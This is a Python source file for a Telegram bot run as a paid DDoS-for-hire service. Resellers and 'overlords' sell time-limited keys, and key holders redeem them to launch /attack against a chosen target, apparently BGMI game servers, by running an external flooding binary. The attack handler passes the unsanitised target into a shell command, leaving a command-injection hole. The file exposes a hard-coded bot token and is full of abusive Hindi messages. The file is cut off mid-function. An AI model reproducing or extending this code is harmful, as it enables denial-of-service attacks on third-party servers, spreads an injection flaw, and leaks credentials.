import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import signal
import sys
from dateutil.relativedelta import relativedelta
import pytz
import shutil
from telebot import formatting
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re

# Add a threading lock for synchronizing active_attacks access
active_attacks_lock = threading.Lock()

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('8147615549:AAGW6usLYzRZzaNiDf2b0NEDM0ZaVa6qZ7E')

# Configure retries for Telegram API requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
bot.session = session  # Attach the session with retries to the bot

# Overlord IDs and usernames (fixed)
overlord_id = {"1807014348", "6258297180"}
overlord_usernames = {"@sadiq9869", "@rahul_618"}

# Dynamic admin IDs and usernames (loaded from file)
admin_id = set()
admin_usernames = set()

# Files and backup directory
DATA_DIR = "data"
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
USER_FILE = os.path.join(DATA_DIR, "users.json")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
FEEDBACK_FILE = os.path.join(DATA_DIR, "feedback.json")
MAX_BACKUPS = 5

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}  # Stores user_id: {expiration, context}
keys = {}   # Stores key: {duration, device_limit, devices, blocked, context}
authorized_users = {}
last_attack_time = {}
active_attacks = {}
COOLDOWN_PERIOD = 0  # Cooldown removed as per March 05, 2025
resellers = {}
feedback_data = {}  # Stores user_id: {last_feedback_time, feedback_text, is_scam, scam_time}
known_chats = set()  # Track all chat IDs where the bot is active

# Stats tracking
bot_start_time = datetime.datetime.now(IST)  # For uptime calculation
stats = {
    "total_keys": 0,
    "active_attacks": 0,
    "total_users": set(),
    "active_users": [],  # Changed from set() to list
    "key_gen_timestamps": [],
    "redeemed_keys": 0,
    "total_attacks": 0,
    "attack_durations": [],
    "expired_keys": 0,
    "peak_active_users": 0,
    "total_feedback": 0,
    "scam_feedback": 0,
    "command_usage": {
        "start": 0, "help": 0, "genkey": 0, "attack": 0,
        "listkeys": 0, "myinfo": 0, "redeem": 0, "stats": 0,
        "addadmin": 0, "removeadmin": 0, "checkadmin": 0,
        "addreseller": 0, "balance": 0, "block": 0, "add": 0,
        "logs": 0, "users": 0, "remove": 0, "resellers": 0,
        "addbalance": 0, "removereseller": 0, "setcooldown": 0,
        "checkcooldown": 0, "feedback": 0
    }
}

# Compulsory message with enhanced UI
COMPULSORY_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔥 **SCAM ALERT!** 🔥\n"
    "Agar koi bhi Rahul DDoS bot ka key **kisi aur se** kharidta hai, toh kisi bhi scam ka **koi responsibility nahi**! 😡\n"
    "✅ **Sirf @Rahul_618** se key lo – yeh hai **Trusted Dealer**! 💎\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━"
)

# Shutdown message
shutdown_message = (
    "<b><i>💥 Oye bhaiyo aur behno, *SupremeBot* abhi thodi der ke liye *bandh* ho raha hai! 🛑 "
    "System ko *gaand phaad* wala upgrade ka *missile booster* lag raha hai! 🚀<br><br>"
    "🔥 Agli baar jab lautega na, to maa kasam — ek-ek gaand phaad daga command mein aag laga dega! 🎇 "
    "Har *move* mein tumhari *gaand* ko *atom bomb* se udaa dega! 💣 "
    "Overlord ji *@sadiq9869* ke hukum se isko itna *bhaukal* bana diya jayega ki server ki *chut* se *khoon* tapkega! 😈<br><br>"
    "😏 Soch rahe ho bot chala gaya? Bhan ka lauda! Yeh toh bas trailer tha, abhe to baki bot ki chut sa khoon nikaal na baki ha! 🍿 "
    "Yeh koi *chintu-mintu* bot nahi, yeh Overlord ka *nuclear missile* hai jo sabki *gaand* ek saath phaad deta hai! ☢️<br><br>"
    "⚡ Soch rahe ho chala gaya? Bhan ka lauda, comeback aisa hoga ki server ki chut se khoon tapkega!🪓 "
    "Tab tak *chup-chaap* apni *aukaat* mein raho, *gaand mein ungli* karke dekho toh wapas aate hi poora *khaandaan* hila denge! 😎 "
    "Overlord ji bolega, “Abe iska *khoon* nikalna chahiye tha, shabashi danga mujh balka!” <br><br>"
    "👑 *SupremeBot* Overlord ke *ma overlord ji ka control ma hu agar nahi hota to pura tg ki maa chod data 😈☠️ "
    "Abhi ke liye apne *dil* thham lo aur ma the supremebot jaldi wapas aane ka intezaar karo!🏴‍☠️</i></b>"
)

# Initialize directory and files
def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE, FEEDBACK_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    elif file == FEEDBACK_FILE:
                        json.dump({}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a').close()

# Reset a JSON file to its default state if corrupted
def reset_json_file(file_path, default_data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(default_data, f, indent=4)
    log_action("SYSTEM", "SYSTEM", "Reset JSON File", f"File: {file_path}, Reset to: {default_data}", "File reset due to corruption")

# Load and validate data with expire check
def load_data():
    global users, keys, authorized_users, resellers, admin_id, admin_usernames, feedback_data, stats
    initialize_system()
    # Attempt to restore from the latest backup on startup
    restore_from_backup()
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Load users and authorized users
            for file in [USER_FILE, AUTHORIZED_USERS_FILE, FEEDBACK_FILE]:
                with open(file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if not isinstance(data, dict):
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {file}, Invalid data type: {type(data)}", "Resetting file")
                        reset_json_file(file, {})
                        data = {}
                    if file == USER_FILE or file == AUTHORIZED_USERS_FILE:
                        for uid, info in list(data.items()):
                            try:
                                exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                                if datetime.datetime.now(IST) > exp_date:
                                    del data[uid]
                                    stats["expired_keys"] += 1
                                else:
                                    data[uid] = info
                                    stats["total_users"].add(uid)
                            except (ValueError, KeyError):
                                del data[uid]
                    if file == USER_FILE:
                        users = data
                    elif file == AUTHORIZED_USERS_FILE:
                        authorized_users = data
                    else:
                        feedback_data = data

            # Load keys
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
                if not isinstance(keys_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {KEY_FILE}, Invalid data type: {type(keys_data)}", "Resetting file")
                    reset_json_file(KEY_FILE, {})
                    keys_data = {}
                for key_name, key_info in list(keys_data.items()):
                    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    minutes, hours, days, months = parse_duration(key_info["duration"])
                    expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
                    if datetime.datetime.now(IST) > expiration_time and not key_info.get("blocked", False):
                        del keys_data[key_name]
                        stats["expired_keys"] += 1
                    else:
                        keys_data[key_name] = key_info
                        stats["total_keys"] += 1
                        stats["key_gen_timestamps"].append(generated_time)
                keys = keys_data

            # Load resellers
            with open(RESELLERS_FILE, 'r', encoding='utf-8') as f:
                resellers_data = json.load(f)
                if not isinstance(resellers_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {RESELLERS_FILE}, Invalid data type: {type(resellers_data)}", "Resetting file")
                    reset_json_file(RESELLERS_FILE, {})
                    resellers_data = {}
                resellers = resellers_data

            # Load cooldown
            with open(COOLDOWN_FILE, 'r', encoding='utf-8') as f:
                cooldown_data = json.load(f)
                if not isinstance(cooldown_data, dict) or "cooldown" not in cooldown_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {COOLDOWN_FILE}, Invalid data: {cooldown_data}", "Resetting file")
                    reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                    cooldown_data = {"cooldown": 0}
                COOLDOWN_PERIOD = cooldown_data.get("cooldown", 0)

            # Load admins
            with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
                admin_data = json.load(f)
                if not isinstance(admin_data, dict) or "ids" not in admin_data or "usernames" not in admin_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {ADMIN_FILE}, Invalid data: {admin_data}", "Resetting file")
                    reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                    admin_data = {"ids": [], "usernames": []}
                admin_id = set(admin_data.get("ids", []))
                admin_usernames = set(admin_data.get("usernames", []))

            print(f"Data loaded successfully. Keys: {list(keys.keys())}, Admins: {admin_id}")
            break

        except (FileNotFoundError, json.JSONDecodeError) as e:
            retry_count += 1
            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Error: {str(e)}, Retry: {retry_count}/{max_retries}", "Attempting to restore from backup")
            print(f"Corruption detected in {e}, attempting to restore from backup (Retry {retry_count}/{max_retries}).")
            restore_from_backup()

            if retry_count == max_retries:
                log_action("SYSTEM", "SYSTEM", "Load Data Failure", f"Error: {str(e)}, Max retries reached", "Resetting all files to default")
                reset_json_file(USER_FILE, {})
                reset_json_file(AUTHORIZED_USERS_FILE, {})
                reset_json_file(KEY_FILE, {})
                reset_json_file(RESELLERS_FILE, {})
                reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                reset_json_file(FEEDBACK_FILE, {})
                users = {}
                authorized_users = {}
                keys = {}
                resellers = {}
                feedback_data = {}
                COOLDOWN_PERIOD = 0
                admin_id = set()
                admin_usernames = set()
                print("Max retries reached, reset all data to default.")
                break

def save_data():
    with open(USER_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)
    with open(AUTHORIZED_USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(authorized_users, f, indent=4)
    with open(KEY_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys, f, indent=4)
    with open(RESELLERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(resellers, f, indent=4)
    with open(COOLDOWN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"cooldown": COOLDOWN_PERIOD}, f, indent=4)
    with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"ids": list(admin_id), "usernames": list(admin_usernames)}, f, indent=4)
    with open(FEEDBACK_FILE, 'w', encoding='utf-8') as f:
        json.dump(feedback_data, f, indent=4)
    print("All data saved successfully.")
    create_backup()  # Create backup after every save

def create_backup():
    backup_time = datetime.datetime.now(IST).strftime('%Y-%m-%d_%I-%M-%S_%p')
    backup_dir = os.path.join(BACKUP_DIR, f"backup_{backup_time}")
    os.makedirs(backup_dir)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
        if os.path.exists(file):
            shutil.copy2(file, os.path.join(backup_dir, os.path.basename(file)))
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if len(backups) > MAX_BACKUPS:
        oldest_backup = min(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        shutil.rmtree(os.path.join(BACKUP_DIR, oldest_backup))
    log_action("SYSTEM", "SYSTEM", "Backup Created", f"Backup directory: {backup_dir}", "Backup created successfully")

def restore_from_backup():
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if backups:
        latest_backup = max(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        backup_path = os.path.join(BACKUP_DIR, latest_backup)
        for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE, FEEDBACK_FILE]:
            src = os.path.join(backup_path, os.path.basename(file))
            if os.path.exists(src):
                shutil.copy2(src, file)
        log_action("SYSTEM", "SYSTEM", "Restore Backup", f"Restored from: {backup_path}", "Backup restored successfully")
        print(f"Restored from latest backup: {backup_path}")
    else:
        log_action("SYSTEM", "SYSTEM", "Restore Backup", "No backups found", "Failed to restore, no backups available")
        print("No backups found for restoration")

def is_overlord(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in overlord_id or username in overlord_usernames)

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in admin_id or username in admin_usernames or is_overlord(user_id, username))

def has_valid_context(user_id, chat_type):
    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp_date:
                return user_info.get('context') == chat_type
        except (ValueError, KeyError):
            return False
    return False

def append_compulsory_message(response):
    return f"{response}\n\n{COMPULSORY_MESSAGE}"

def safe_reply(bot, message, text):
    try:
        text_with_compulsory = append_compulsory_message(text)
        escaped_text = formatting.escape_markdown(text_with_compulsory)
        bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
        known_chats.add(message.chat.id)  # Track chat ID
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Message not found: chat_id={message.chat.id}, message_id={message.message_id}, user_id={message.from_user.id}, text={text}\n")
            escaped_text = formatting.escape_markdown(append_compulsory_message(text))
            bot.send_message(message.chat.id, escaped_text, parse_mode="MarkdownV2")
            known_chats.add(message.chat.id)
        else:
            log_error(f"Error in safe_reply: {str(e)}", message.from_user.id, message.from_user.username)
            raise e

def log_action(user_id, username, command, details="", response="", error=""):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Command: {command}\n"
        f"Details: {details}\n"
        f"Response: {response}\n"
    )
    if error:
        log_entry += f"Error: {error}\n"
    log_entry += "----------------------------------------\n"
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def log_error(error_message, user_id, username):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Error: {error_message}\n"
        "----------------------------------------\n"
    )
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open(COOLDOWN_FILE, "w") as file:
        json.dump({"cooldown": seconds}, file)

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Stats utility functions
def calculate_uptime():
    uptime = datetime.datetime.now(IST) - bot_start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def calculate_keys_per_minute():
    current_time = datetime.datetime.now(IST)
    one_minute_ago = current_time - datetime.timedelta(minutes=1)
    recent_keys = [ts for ts in stats["key_gen_timestamps"] if ts >= one_minute_ago]
    return len(recent_keys)

def calculate_avg_attack_duration():
    if not stats["attack_durations"]:
        return "0s"
    avg_duration = sum(stats["attack_durations"]) / len(stats["attack_durations"])
    return f"{int(avg_duration)}s"

def update_active_users():
    current_time = datetime.datetime.now(IST)
    stats["active_users"] = [user for user in stats["active_users"] if (current_time - user["last_active"]).total_seconds() < 300]
    return len(stats["active_users"])

# Live Stats Dashboard for Overlord
def live_stats_update(chat_id, message_id):
    while True:
        try:
            active_users = update_active_users()
            active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60])
            command_usage_str = "\n".join([f"📜 **/{cmd}**: __{count}__" for cmd, count in stats["command_usage"].items() if count > 0])
            stats_message = (
                "🚀 **SupremeBot Live Stats Dashboard** 🚀\n\n"
                f"⏰ **Uptime**: {calculate_uptime()}\n"
                f"👥 **Total Users**: {len(stats['total_users'])}\n"
                f"🟢 **Active Users (last 5 min)**: {active_users}\n"
                f"🔑 **Total Keys Generated**: {stats['total_keys']}\n"
                f"🟢 **Active Keys**: {active_keys}\n"
                f"📈 **Keys Generated/min**: {calculate_keys_per_minute()}\n"
                f"💥 **Total Attacks Launched**: {stats['total_attacks']}\n"
                f"⏳ **Avg Attack Duration**: {calculate_avg_attack_duration()}\n"
                f"🔴 **Expired Keys**: {stats['expired_keys']}\n"
                f"📩 **Total Feedback**: {stats['total_feedback']}\n"
                f"🚨 **Scam Feedback**: {stats['scam_feedback']}\n"
                f"📊 **Command Usage**:\n{command_usage_str}\n"
            )
            bot.edit_message_text(stats_message, chat_id, message_id, parse_mode="MarkdownV2")
            time.sleep(5)  # Update every 5 seconds
        except Exception as e:
            log_error(f"Live stats update error: {str(e)}", "SYSTEM", "SYSTEM")
            time.sleep(5)

# Command Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    stats["command_usage"]["start"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    welcome_message = (
        "🚀 **Welcome to SupremeBot!** 🚀\n\n"
        "The most powerful bot in the universe! 🌌\n"
        "Use /help to see all commands and unleash the power! 💥"
    )
    safe_reply(bot, message, welcome_message)
    log_action(user_id, username, "/start", response=welcome_message)

@bot.message_handler(commands=['help'])
def send_help(message):
    stats["command_usage"]["help"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    help_message = (
        "🛠 **SupremeBot Commands** 🛠\n\n"
        "🔹 **For Everyone**:\n"
        "/start - Start the bot\n"
        "/help - Show this help message\n"
        "/redeem <key> - Redeem a key\n"
        "/myinfo - Check your info\n"
        "/attack <target> <time> - Launch an attack (if authorized)\n"
        "/feedback <text> - Submit feedback\n\n"
        "🔹 **For Resellers**:\n"
        "/balance - Check your balance\n"
        "/genkey <duration> <key_name> - Generate a key (if authorized)\n\n"
        "🔹 **For Admins/Overlords**:\n"
        "/genkey <duration> <device_limit> <key_name> <context> - Generate a key\n"
        "/listkeys - List all keys\n"
        "/block <key> - Block a key\n"
        "/add <user_id> - Authorize a user\n"
        "/remove <user_id> - Remove a user\n"
        "/users - List authorized users\n"
        "/logs - View recent logs\n"
        "/addadmin <user_id> - Add an admin\n"
        "/removeadmin <user_id> - Remove an admin\n"
        "/checkadmin - List all admins\n"
        "/addreseller <user_id> - Add a reseller\n"
        "/removereseller <user_id> - Remove a reseller\n"
        "/addbalance <user_id> <amount> - Add balance to a reseller\n"
        "/resellers - List all resellers\n"
        "/setcooldown <seconds> - Set attack cooldown\n"
        "/checkcooldown - Check current cooldown\n"
        "/stats - View bot stats\n"
    )
    safe_reply(bot, message, help_message)
    log_action(user_id, username, "/help", response=help_message)

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    stats["command_usage"]["genkey"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    # Restrict key generation to @sadiq9869 with ID 1807014348
    if not (username.lower() == "@sadiq9869" and user_id == "1807014348"):
        error_message = "kry system error detected please call @sadiq9869 to generate any key"
        safe_reply(bot, message, error_message)
        log_action(user_id, username, "/genkey", "Unauthorized attempt", error_message)
        return

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can generate keys.")
        log_action(user_id, username, "/genkey", "Not an Overlord", "Error: Only Overlords can generate keys.")
        return

    try:
        command = message.text.split()
        if len(command) != 5:
            safe_reply(bot, message, "Usage: /genkey <duration> <device_limit> <key_name> <context>")
            log_action(user_id, username, "/genkey", "Invalid command format", "Usage prompt sent")
            return

        duration, device_limit, key_name, context = command[1], command[2], command[3], command[4]
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None:
            safe_reply(bot, message, "Invalid duration format! Use 1min, 1h, 1d, or 1m.")
            log_action(user_id, username, "/genkey", f"Invalid duration: {duration}", "Error: Invalid duration format")
            return

        try:
            device_limit = int(device_limit)
            if device_limit <= 0:
                raise ValueError
        except ValueError:
            safe_reply(bot, message, "Device limit must be a positive integer!")
            log_action(user_id, username, "/genkey", f"Invalid device limit: {device_limit}", "Error: Invalid device limit")
            return

        if key_name in keys:
            safe_reply(bot, message, f"Key '{key_name}' already exists!")
            log_action(user_id, username, "/genkey", f"Key exists: {key_name}", "Error: Key already exists")
            return

        generated_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": [],
            "blocked": False,
            "generated_time": generated_time,
            "context": context
        }
        stats["total_keys"] += 1
        stats["key_gen_timestamps"].append(datetime.datetime.now(IST))
        save_data()

        response = f"Key generated successfully!\nKey: {key_name}\nDuration: {duration}\nDevice Limit: {device_limit}\nContext: {context}"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Key: {key_name}, Duration: {duration}, Device Limit: {device_limit}, Context: {context}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /genkey: {str(e)}", user_id, username)

def execute_attack(user_id, username, target, duration, message):
    global active_attacks
    try:
        # Simulate attack execution
        command = f"./Rohan {target} {duration}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[user_id] = process.pid
        stats["active_attacks"] += 1

        # Wait for the attack to complete
        time.sleep(int(duration))

        # Check if process is still running and terminate if necessary
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()

        # Get output
        stdout, stderr = process.communicate()
        if stderr:
            with open(BLOCK_ERROR_LOG, "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Attack Error: {stderr.decode()}\n")

        # Special message for Overlord
        if is_overlord(user_id, username):
            overlord_message = "Kripya karke BGMI ko tazi sa na choda warna chut sa khoon nikal jayga."
            safe_reply(bot, message, overlord_message)
            log_action(user_id, username, "/attack", f"Overlord attack on {target} for {duration}s", overlord_message)

        # Send attack completion message
        response = f"Attack Sent Successfully\nTarget: {target}\nTime: {duration} seconds\nPacket Size: 512 bytes\nThreads: 1200\nAttacker: @{username}"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Attack on {target} for {duration}s", response)

        # Update stats
        stats["total_attacks"] += 1
        stats["attack_durations"].append(int(duration))
    except Exception as e:
        error_message = f"Error during attack: {str(e)}"
        safe_reply(bot, message, error_message)
        log_error(error_message, user_id, username)
    finally:
        with active_attacks_lock:
            if user_id in active_attacks:
                del active_attacks[user_id]
            stats["active_attacks"] -= 1

@bot.message_handler(commands=['attack'])
def launch_attack(message):
    stats["command_usage"]["attack"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    # Check if user is authorized
    if user_id not in users and user_id not in authorized_users:
        safe_reply(bot, message, "Error: You need to redeem a key or be authorized to use this command.")
        log_action(user_id, username, "/attack", "Unauthorized", "Error: Not authorized")
        return

    # Check context
    chat_type = "group" if message.chat.type in ["group", "supergroup"] else "private"
    if not has_valid_context(user_id, chat_type) and user_id not in authorized_users:
        safe_reply(bot, message, "Error: You can only use this command in the context where your key was redeemed.")
        log_action(user_id, username, "/attack", "Invalid context", "Error: Invalid context")
        return

    # Check if user already has an active attack
    with active_attacks_lock:
        if user_id in active_attacks:
            if is_overlord(user_id, username):
                error_message = "🚫 **_Kripya karke BGMI ko tazi sa na choda! Ek attack already chal raha hai, wait karo._**"
            else:
                error_message = "🚫 **_BSDK, ruk ja warna gaand mar dunga teri! Ek attack chal raha hai, dusra mat try kar_**"
            safe_reply(bot, message, error_message)
            log_action(user_id, username, "/attack", "Multiple attack attempt", error_message)
            return

    # Check cooldown
    current_time = time.time()
    if user_id in last_attack_time:
        elapsed = current_time - last_attack_time[user_id]
        if elapsed < COOLDOWN_PERIOD:
            remaining = int(COOLDOWN_PERIOD - elapsed)
            safe_reply(bot, message, f"Please wait {remaining} seconds before launching another attack.")
            log_action(user_id, username, "/attack", f"Cooldown active, remaining: {remaining}s", f"Cooldown error: {remaining}s remaining")
            return

    try:
        command = message.text.split()
        if len(command) != 3:
            safe_reply(bot, message, "Usage: /attack <target> <time>")
            log_action(user_id, username, "/attack", "Invalid command format", "Usage prompt sent")
            return

        target, duration = command[1], command[2]
        try:
            duration = int(duration)
            if duration <= 0 or duration > 3600:
                raise ValueError
        except ValueError:
            safe_reply(bot, message, "Time must be a positive integer between 1 and 3600 seconds!")
            log_action(user_id, username, "/attack", f"Invalid duration: {duration}", "Error: Invalid duration")
            return

        last_attack_time[user_id] = current_time

        # Start attack in a separate thread
        attack_thread = threading.Thread(target=execute_attack, args=(user_id, username, target, duration, message))
        attack_thread.start()

        # Log the initiation of the attack
        log_action(user_id, username, "/attack", f"Initiated attack on {target} for {duration}s", "Attack thread started")
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /attack: {str(e)}", user_id, username)

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    stats["command_usage"]["redeem"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /redeem <key>")
            log_action(user_id, username, "/redeem", "Invalid command format", "Usage prompt sent")
            return

        key = command[1]
        if key not in keys:
            safe_reply(bot, message, "Invalid or expired key!")
            log_action(user_id, username, "/redeem", f"Invalid key: {key}", "Error: Invalid key")
            return

        key_info = keys[key]
        if key_info.get("blocked", False):
            safe_reply(bot, message, "This key has been blocked!")
            log_action(user_id, username, "/redeem", f"Blocked key: {key}", "Error: Key blocked")
            return

        if user_id in key_info["devices"]:
            safe_reply(bot, message, "You have already redeemed this key!")
            log_action(user_id, username, "/redeem", f"Key already redeemed: {key}", "Error: Already redeemed")
            return

        if len(key_info["devices"]) >= key_info["device_limit"]:
            safe_reply(bot, message, "This key has reached its device limit!")
            log_action(user_id, username, "/redeem", f"Device limit reached: {key}", "Error: Device limit reached")
            return

        generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        minutes, hours, days, months = parse_duration(key_info["duration"])
        expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)

        if datetime.datetime.now(IST) > expiration_time:
            safe_reply(bot, message, "This key has expired!")
            log_action(user_id, username, "/redeem", f"Expired key: {key}", "Error: Key expired")
            return

        key_info["devices"].append(user_id)
        users[user_id] = {
            "expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "context": "group" if message.chat.type in ["group", "supergroup"] else "private"
        }
        stats["redeemed_keys"] += 1
        save_data()

        response = f"Key redeemed successfully!\nExpiration: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}, Expiration: {expiration_time}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /redeem: {str(e)}", user_id, username)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    stats["command_usage"]["myinfo"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
